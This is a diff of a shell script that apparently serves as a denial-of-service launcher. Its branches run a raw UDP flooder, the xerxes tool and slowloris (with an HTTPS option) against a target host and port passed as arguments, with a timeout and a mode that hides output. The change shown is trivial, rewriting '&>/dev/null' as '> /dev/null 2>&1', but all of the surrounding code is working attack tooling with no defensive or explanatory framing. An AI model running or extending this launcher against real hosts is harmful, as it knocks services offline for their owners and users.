@@ -81,7 +81,7 @@ if [ $1 == 'rawudp' ]
 				perl u $2 $3 $5 $4
 		elif [ $6 -eq 1 ]
 			then
-				perl u $2 $3 $5 $4 &>/dev/null
+				perl u $2 $3 $5 $4 > /dev/null 2>&1
 		else
 			exit
 		fi
@@ -113,7 +113,7 @@ if [ $1 == 'xerxes' ]
 				timeout $4 ./x $2 $3
 		elif [ $5 -eq 1 ]
 			then
-				timeout $4 ./x $2 $3 &>/dev/null
+				timeout $4 ./x $2 $3 > /dev/null 2>&1
 		else
 			exit
 		fi
@@ -152,7 +152,7 @@ if [ $1 == 'slowloris' ]
 						timeout $4 perl s -dns $2 -port $3 -https
 				elif [ $6 -eq 1 ]
 					then
-						timeout $4 perl s -dns $2 -port $3 -https &>/dev/null
+						timeout $4 perl s -dns $2 -port $3 -https > /dev/null 2>&1
 				else
 					exit
 				fi
@@ -165,7 +165,7 @@ if [ $1 == 'slowloris' ]
 					timeout $4 perl s -dns $2 -port $3
 			elif [ $6 -eq 1 ]
 				then
-					timeout $4 perl s -dns $2 -port $3 &>/dev/null
+					timeout $4 perl s -dns $2 -port $3 > /dev/null 2>&1
 			else
 				exit
 			fi
